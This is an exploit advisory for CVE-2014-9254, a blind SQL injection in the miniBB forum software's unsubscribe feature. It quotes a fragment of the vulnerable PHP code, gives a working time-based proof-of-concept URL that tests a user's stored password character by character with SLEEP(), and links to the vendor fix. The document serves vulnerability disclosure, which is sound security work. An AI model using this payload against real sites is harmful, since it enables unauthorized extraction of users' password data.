# Date: 23-11-2014
# Software Link: http://www.minibb.com/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# CVE: CVE-2014-9254
# Category: webapps

1. Description
  

File: bb_func_unsub.php
$usrid=(isset($_GET[&#039;usrid&#039;])?$_GET[&#039;usrid&#039;]+0:0);

$allowUnsub=FALSE;
$chkCode=FALSE;

	//trying to unsubscribe directly from email
	$chkField=&#039;email_code&#039;;
	$chkVal=$_GET[&#039;code&#039;];
	$userCondition=TRUE;
	$chkCode=TRUE;
}
else{
	//manual unsubsribe
	$chkField=&#039;user_id&#039;;
	$chkVal=$user_id;
	$userCondition=($usrid==$user_id);
}

if ($topic!=0 and $usrid>0 and $userCondition and $ids=db_simpleSelect(0, $Ts, &#039;id, user_id&#039;, &#039;topic_id&#039;, &#039;=&#039;, $topic, &#039;&#039;, &#039;&#039;, $chkField, &#039;=&#039;, $chkVal))

http://security.szurek.pl/minibb-31-blind-sql-injection.html
  
2. Proof of Concept

http://minibb-url/index.php?action=unsubscribe&usrid=1&topic=1&code=test&#039; UNION SELECT 1, IF(substr(user_password,1,1) = CHAR(99), SLEEP(5), 0) FROM minibbtable_users WHERE user_id = 1 AND username != &#039;

This SQL will check if first password character user ID=1 is “c”.

If yes, it will sleep 5 seconds.
  
3. Solution:
  
http://www.minibb.com/forums/news-9/blind-sql-injection-fix-6430.html

